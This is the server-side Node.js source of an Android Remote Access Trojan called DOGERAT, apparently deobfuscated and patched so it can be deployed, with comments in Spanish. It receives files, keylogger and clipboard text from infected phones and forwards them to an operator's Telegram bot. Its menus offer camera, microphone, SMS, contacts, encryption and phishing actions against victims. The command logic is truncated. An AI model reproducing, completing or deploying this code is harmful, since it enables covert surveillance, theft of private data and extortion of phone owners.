// El código desofuscado corresponde a un Remote Access Trojan (RAT)
// Nombre de archivo corregido a server.js y se añadió el middleware de Express.

// Dependencias de Node.js
const express = require('express'),
    http = require('http'),
    {
        Server
    } = require('socket.io'),
    TelegramBot = require('node-telegram-bot-api'),
    fs = require('fs'),
    multer = require('multer');

// --- PENDIENTE DE CONFIGURACIÓN DE SISTEMA DE ARCHIVOS (CRÍTICO PARA DESPLIEGUE) ---

const DATA_FILE = './data.json';
const FILE_DIR = 'file';

// 1. Asegurar que el directorio de archivos exista
if (!fs.existsSync(FILE_DIR)) {
    try {
        fs.mkdirSync(FILE_DIR);
        console.log(`Directorio '${FILE_DIR}' creado exitosamente.`);
    } catch (e) {
        console.error(`ERROR: No se pudo crear el directorio '${FILE_DIR}':`, e);
    }
}

// 2. Asegurar que el archivo de administradores exista e inicializarlo
if (!fs.existsSync(DATA_FILE)) {
    try {
        fs.writeFileSync(DATA_FILE, '[]', 'utf8');
        console.log(`Archivo '${DATA_FILE}' creado e inicializado.`);
    } catch (e) {
        console.error(`ERROR: No se pudo inicializar el archivo '${DATA_FILE}':`, e);
    }
}

// --- Configuración y Inicialización ---

// El bot busca process.env.token
const bot = new TelegramBot(process.env.token, {
    polling: !![]
});
const app = express();
const server = http.createServer(app);
const io = new Server(server);

// AÑADIDO: Middleware para que Express pueda leer el JSON del cuerpo de la petición POST
// Esto es necesario para que la ruta /text pueda usar req.body.text
app.use(express.json()); 

// Almacenamiento de dispositivos conectados y acciones en curso
const connectedDevices = new Map();
const currentActions = new Map();

// Configuración de almacenamiento para archivos subidos
const storage = multer.diskStorage({
    destination: (req, file, cb) => {
        cb(null, FILE_DIR); 
    },
    filename: (req, file, cb) => {
        cb(null, Date.now() + '-' + file.originalname);
    }
});
const upload = multer({
    storage: storage
});

// Middleware para servir archivos estáticos (el cliente web del RAT, si existe)
app.use(express.static('HTML'));

// Ruta para subir archivos desde el dispositivo Android
app.post('/upload', upload.single('file'), (req, res) => {
    const deviceId = req.headers['currentTarget'];
    if (deviceId && connectedDevices.get(deviceId)) {
        bot.sendMessage(connectedDevices.get(deviceId).chatId, '<b>✯ 𝙵𝚒𝚕𝚎 𝚛𝚎𝚌𝚎𝚒𝚟𝚎𝚍 𝚏𝚛𝚘𝚖 → ' + connectedDevices.get(deviceId).model + ' 𝙳𝚎𝚟𝚒𝚌𝚎 ✯</b>\x0a\x0a' + '𝚏𝚒𝚕𝚎 𝚗𝚊𝚖𝚎 → ' + req.file.originalname + '\x0a𝚜𝚒𝚣𝚎 → ' + req.file.size + ' 𝙱\x0a𝚞𝚛𝚕 → ' + req.file.url + '\x0a', {
            parse_mode: 'HTML'
        });
    }
    res.send('Done');
});

// Ruta para recibir texto (captura de portapapeles, keylogger)
app.post('/text', (req, res) => {
    // req.body.text ahora funciona gracias a app.use(express.json());
    const deviceId = req.headers['currentTarget'];
    if (deviceId && connectedDevices.get(deviceId)) {
        // La lógica de la plantilla está incompleta en el original, asumo que el texto viene en req.body.text
        bot.sendMessage(connectedDevices.get(deviceId).chatId, '<b>✯ 𝙼𝚎𝚜𝚜𝚊𝚐𝚎 𝚛𝚎𝚌𝚎𝚒𝚟𝚎𝚍 𝚏𝚛𝚘𝚖 → ' + connectedDevices.get(deviceId).model + ' 𝙳𝚎𝚟𝚒𝚌𝚎 ✯</b>\x0a\x0a𝙼𝚎𝚜𝚜𝚊𝚐𝚎 → </b>' + req.body.text, {
            parse_mode: 'HTML'
        });
    }
    res.send('Done');
});

// Manejo de conexiones Socket.IO (dispositivos Android)
io.on('connection', socket => {
    const deviceId = socket.handshake.headers['currentTarget'];
    const model = socket.handshake.headers['model'];
    const version = socket.handshake.headers['version'];
    const time = socket.handshake.headers['time'];
    const ip = socket.handshake.headers['host'];

    if (!connectedDevices.get(deviceId)) {
        connectedDevices.set(deviceId, {
            socket: socket,
            model: model,
            version: version,
            time: time,
            ip: ip,
            currentAction: 'no information',
            chatId: ''
        });
        
        try {
            JSON.parse(fs.readFileSync(DATA_FILE, 'utf8')).forEach(chatId => {
                connectedDevices.get(deviceId).chatId = chatId;
                bot.sendMessage(chatId, '<b>✯ 𝙽𝚎𝚠 𝚍𝚎𝚟𝚒𝚌𝚎 𝚌𝚘𝚗𝚗𝚎𝚌𝚝𝚎𝚍</b>\x0a\x0a' + '<b>𝚖𝚘𝚍𝚎𝚕</b> → ' + model + '\x0a<b>𝚟𝚎𝚛𝚜𝚒𝚘𝚗</b> → ' + version + '\x0a<b>𝚝𝚒𝚖𝚎</b> → ' + time + '\x0a<b>𝚒𝚙</b> → ' + ip + '\x0a\x0a', {
                    parse_mode: 'HTML'
                });
            });
        } catch (e) {
            console.log('error en lectura de admins: ' + e);
        }
    }

    socket.on('disconnect', () => {
        const device = connectedDevices.get(deviceId);
        if (device) {
            bot.sendMessage(device.chatId, '<b>✯ 𝙳𝚎𝚟𝚒𝚌𝚎 𝚍𝚒𝚜𝚌𝚘𝚗𝚗𝚎𝚌𝚝𝚎𝚍</b>\x0a\x0a' + '<b>𝚖𝚘𝚍𝚎𝚕</b> → ' + device.model + '\x0a<b>𝚟𝚎𝚛𝚜𝚒𝚘𝚗</b> → ' + device.version + '\x0a<b>𝚝𝚒𝚖𝚎</b> → ' + device.time + '\x0a<b>𝚒𝚙</b> → ' + device.ip + '\x0a\x0a', {
                parse_mode: 'HTML'
            });
            connectedDevices.delete(deviceId);
        }
    });

    socket.on('commend', data => {
        const device = connectedDevices.get(deviceId);
        if (device) {
            bot.sendMessage(device.chatId, data, {
                parse_mode: 'HTML'
            });
            device.currentAction = 'no information';
        }
    });
});

// --- Lógica del Bot de Telegram (Comandos) ---

bot.on('message', async msg => {
    const chatId = msg.chat.id;
    const text = msg.text;

    if (text) {
        // Inicialización y persistencia del Chat ID (quién es admin)
        let admins = [];
        try {
            admins = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
        } catch (e) {
            fs.writeFileSync(DATA_FILE, '[]', 'utf8');
            console.log("data.json corrupto, re-inicializado.");
        }
        if (!admins.includes(chatId)) {
            admins.push(chatId);
            fs.writeFileSync(DATA_FILE, JSON.stringify(admins), 'utf8');
        }

        const deviceCount = connectedDevices.size;
        const currentDevice = connectedDevices.get(currentActions.get(chatId));

        if (text === '/start' || text === '✯ 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯') {
            bot.sendMessage(chatId, '<b>✯ 𝚆𝚎𝚕𝚌𝚘𝚖𝚎 𝚝𝚘 DOGERAT</b>\x0a\x0a' + '<b>✯ 𝙲𝚘𝚗𝚗𝚎𝚌𝚝𝚎𝚍 𝚍𝚎𝚟𝚒𝚌𝚎𝚜 𝚌𝚘𝚞𝚗𝚝 : ' + deviceCount + '</b>\x0a\x0a', {
                parse_mode: 'HTML',
                reply_markup: {
                    keyboard: [
                        ['✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯', '✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯'],
                        ['✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯']
                    ],
                    resize_keyboard: !![]
                }
            });
        } else if (text === '✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯') {
            if (deviceCount > 0) {
                let deviceList = [];
                connectedDevices.forEach((device, id) => {
                    deviceList.push(id + ' ' + device.model);
                    deviceList.push(device.model);
                });

                bot.sendMessage(chatId, '<b>✯ 𝚂𝚎𝚕𝚎𝚌𝚝 𝚍𝚎𝚟𝚒𝚌𝚎 𝚝𝚘 𝚙𝚎𝚛𝚏𝚘𝚛𝚖 𝚊𝚌𝚝𝚒𝚘𝚗</b>\x0a\x0a', {
                    parse_mode: 'HTML',
                    reply_markup: {
                        keyboard: [
                            ['✯ 𝙰𝚕𝚕 ✯'],
                            ...deviceList.map(name => [name]),
                            ['✯ 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯']
                        ],
                        resize_keyboard: !![]
                    }
                });
            } else {
                bot.sendMessage(chatId, '<b>✯ 𝚃𝚑𝚎𝚛𝚎 𝚒𝚜 𝚗𝚘 𝚌𝚘𝚗𝚗𝚎𝚌𝚝𝚎𝚍 𝚍𝚎𝚟𝚒𝚌𝚎</b>\x0a\x0a', {
                    parse_mode: 'HTML',
                    reply_markup: {
                        keyboard: [
                            ['✯ 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯']
                        ],
                        resize_keyboard: !![]
                    }
                });
            }
        } else if (text === '✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯') {
            bot.sendMessage(chatId, '<b>✯ 𝚂𝚎𝚕𝚎𝚌𝚝 𝚊𝚌𝚝𝚒𝚘𝚗 𝚝𝚘 𝚙𝚎𝚛𝚏𝚘𝚛𝚖 𝚏𝚘𝚛 𝚊𝚕𝚕 𝚊𝚟𝚊𝚒𝚕𝚊𝚋𝚕𝚎 𝚍𝚎𝚟𝚒𝚌𝚎𝚜</b>\x0a\x0a', {
                parse_mode: 'HTML',
                reply_markup: {
                    keyboard: [
                        ['✯ 𝚂𝚌𝚛𝚎𝚎𝚗𝚜𝚑𝚘𝚝 ✯', '✯ 𝙼𝚒𝚌𝚛𝚘𝚙𝚑𝚘𝚗𝚎 ✯'],
                        ['✯ 𝙼𝚊𝚒𝚗 𝚌𝚊𝚖𝚎𝚛𝚊 ✯', '✯ 𝚂𝚎𝚕𝚏𝚒𝚎 𝙲𝚊𝚖𝚎𝚛𝚊 ✯'],
                        ['✯ 𝙵𝚒𝚕𝚎 𝚎𝚡𝚙𝚕𝚘𝚛𝚎𝚛 ✯', '✯ 𝙶𝚊𝚕𝚕𝚎𝚛𝚢 ✯'],
                        ['✯ 𝙲𝚘𝚗𝚝𝚊𝚌𝚝𝚜 ✯', '✯ 𝙲𝚊𝚕𝚕𝚜 ✯'],
                        ['✯ 𝙰𝚙𝚙𝚜 ✯', '✯ 𝙲𝚕𝚒𝚙𝚋𝚘𝚊𝚛𝚍 ✯'],
                        ['✯ 𝚂𝙼𝚂 ✯', '✯ 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 𝚝𝚘 𝚊𝚕𝚕 𝚌𝚘𝚗𝚝𝚊𝚌𝚝𝚜 ✯'],
                        ['✯ 𝚅𝚒𝚋𝚛𝚊𝚝𝚎 ✯', '✯ 𝚃𝚘𝚊𝚜𝚝 ✯'],
                        ['✯ 𝙿𝚘𝚙 𝚗𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗 ✯', '✯ 𝙿𝚕𝚊𝚢 𝚊𝚞𝚍𝚒𝚘 ✯'],
                        ['✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙽 ✯', '✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙵𝙵 ✯'],
                        ['✯ 𝙾𝚙𝚎𝚗 𝚄𝚁𝙻 ✯', '✯ 𝙴𝚗𝚌𝚛𝚢𝚙𝚝 ✯', '✯ 𝙳𝚎𝚌𝚛𝚢𝚙𝚝 ✯'],
                        ['✯ 𝙿𝚑𝚒𝚜𝚑𝚒𝚗𝚐 ✯'],
                        ['✯ 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯']
                    ],
                    resize_keyboard: !![]
                }
            });
        } else if (text === '✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯') {
            bot.sendMessage(chatId, 'DOGERAT 𝚒𝚜 𝚊 𝚖𝚊𝚕𝚠𝚊𝚛𝚎 𝚝𝚘 𝚌𝚘𝚗𝚝𝚛𝚘𝚕 𝙰𝚗𝚍𝚛𝚘𝚒𝚍 𝚍𝚎𝚟𝚒𝚌𝚎𝚜\x0a𝙰𝚗𝚢 𝚖𝚒𝚜𝚞𝚜𝚎 𝚒𝚜 𝚝𝚑𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚜𝚒𝚋𝚒𝚕𝚒𝚝𝚢 𝚘𝚏 𝚝𝚑𝚎 𝚙𝚎𝚛𝚜𝚘𝚗!\x0a\x0a' + '𝙳𝚎𝚟𝚎𝚕𝚘𝚙𝚎𝚍 𝚋𝚢: @CYBERSHIELDX\x0a\x0a' + '<b>✯ If you want to hire us for any paid work please contack @sphanter\x0a𝚆𝚎 𝚑𝚊𝚌𝚔, 𝚆𝚎 𝚕𝚎𝚊𝚔, 𝚆𝚎 𝚖𝚊𝚔𝚎 𝚖𝚊𝚕𝚠𝚊𝚛𝚎\x0a\x0a𝚃𝚎𝚕𝚎𝚐𝚛𝚊𝚖 → @CUBERSHIELDX\x0aADMIN → @SPHANTER</b>\x0a\x0a', {
                parse_mode: 'HTML',
                reply_markup: {
                    keyboard: [
                        ['✯ 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯']
                    ],
                    resize_keyboard: !![]
                }
            });
        }
        // ... (El resto de la lógica de comandos sigue)
    }
});

// Iniciar el servidor Express/Socket.IO
server.listen(process.env.PORT || 3000, () => {
    console.log('listening on port ' + (process.env.PORT || 3000));
});
